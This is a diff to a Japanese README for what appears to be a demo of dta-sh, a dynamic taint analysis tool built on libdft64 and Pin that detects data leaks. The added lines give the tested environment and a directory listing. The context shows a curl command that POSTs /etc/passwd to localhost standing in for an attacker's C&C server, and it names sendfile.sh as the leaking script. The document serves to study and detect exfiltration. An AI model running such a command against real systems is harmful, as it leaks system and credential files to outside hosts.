@@ -15,6 +15,8 @@ curl -X POST -F f=@"/etc/passwd" localhost:9999
 本来localhost:9999の部分は攻撃者が用意するC&Cサーバのドメイン名であるが、漏洩させるファイルを自身で受け取るためここではlocalhostとなる。
 
 ### デモの実行方法
+環境は Ubuntu 20.04 LST or 22.04 LTSで動作確認済み（WSL2でも動く）。
+
 ```bash
 # 依存関係をインストール（初回のみ）
 ./setup.sh
@@ -43,6 +45,24 @@ make test
 ```
 先程サーバを起動したターミナルに戻ると、赤文字の`/etc/passwd`の内容が出力されているはず。
 これはサーバが受け取ったデータで、POSTリクエストにより`/etc/passwd`の内容が漏洩した。
+
+## 各ディレクトリ・ファイルの説明
+```
+.
+├── env.init    # 環境変数(PIN_ROOT)の設定
+├── libdft64    # 動的テイント解析ライブラリ
+├── pin-3.20-98437-gf02b61307-gcc-linux         # libdft64の依存ライブラリ
+├── pin-3.20-98437-gf02b61307-gcc-linux.tar.gz  # ↑の圧縮ファイル
+├── README.md   # このファイル
+├── server.py   # POSTリクエストを受け取るHTTPサーバ
+├── setup.sh    # セットアップファイル
+└── src # ソースコード
+    ├── dta-sh.cpp      # ツールの本体
+    ├── dta-sh.h        # ヘッダファイル
+    ├── Makefile        # ビルドスクリプト
+    ├── makefile.rules  # ビルドスクリプト
+    └── sendfile.sh     # 情報漏洩を行うシェルスクリプト
+```
 
 ## FAQ
 エラーに関するものは起きたエラーがそのままタイトル。
